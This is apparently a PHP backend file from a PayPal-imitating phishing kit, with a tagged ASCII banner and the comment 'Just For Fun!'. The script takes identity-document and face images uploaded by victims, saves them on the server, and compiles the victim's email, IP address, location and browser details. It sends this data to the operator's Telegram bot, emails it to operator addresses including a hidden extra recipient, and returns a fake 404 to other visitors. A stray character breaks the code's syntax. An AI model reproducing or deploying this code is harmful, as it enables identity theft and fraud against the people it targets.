<?php
/*
  _______ _           _       _      _______    
 |__   __(_)Sel3a    | |TND95| |    |__   __|   
    | |   _ _ __   __| | __ _| |_The   | |_ __  
    | |  | | '_ \ / _` |/ _` | | | | | | | '_ \ 
    | |  | | | | | (_| | (_| | | |_| |_| | | | |
    |_|  |_|_| |_|\__,_|\__,_|_|\__, (_)_|_| |_|
     Just For Fun!               __/ |          
*/
    if(isset($_POST['doc_type'])&&isset($_POST['images'])){
	session_start();
	include '../mine.php';
	include '../bot.php';
|
	function upImg($vl){
		$t=microtime(true);
		$micro=sprintf("%06d",($t - floor($t))* 1000000);
		$today=date("m.d.y.h.i.s.U".$micro,$t);
		$name=hash('md5',$today);
		$type=explode(';',$vl)[0];
		$type='.'.explode('/',$type)[1];
		$base='Folder -> /proof/ Image Name ->';
		file_put_contents('./../../proof/'.$name.$type,base64_decode(explode(',',$vl)[1]));
		return $base.$name.$type;}$_SESSION['doc_type']=$_POST['doc_type'];
		$msg="=========== <[ -".$scamname."- TAYPAL IDENTITY ]> ===========\r\n";
		$msg.="ID OF USER	: {$_SESSION['EML']}\r\n";
		$msg.="TYPE		: {$_POST['doc_type']}\r\n";
		for($i=0;$i<count($_POST['images']);$i++){$msg.="FACE (".(int)($i+1).")	: ".upImg($_POST['images'][$i])."\r\n";
	}
$msg.="---------------------- IP Info ----------------------\r\n";
$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
$msg.="TIME		: ".now()." GMT\r\n";
	$msg.="=========== <[ INF ]> ===========\r\n\r\n\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );

$subject="-".$scamname."- PPL IDENTITY [".$_POST['doc_type']."] From [".$_SESSION['ip_countryName']."]";$headers="From: xAthena <NewID@sh33nz0.com>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	foreach(explode(",",$yours) as $your){
			@mail($your,$subject,$msg,$headers);
			@mail($nobot,$subject,$msg,$headers);
	}
	}
}
exit('done');
}if(!isset($_POST['doc_type'])){
     header('HTTP/1.0 404 Not Found');
}
?>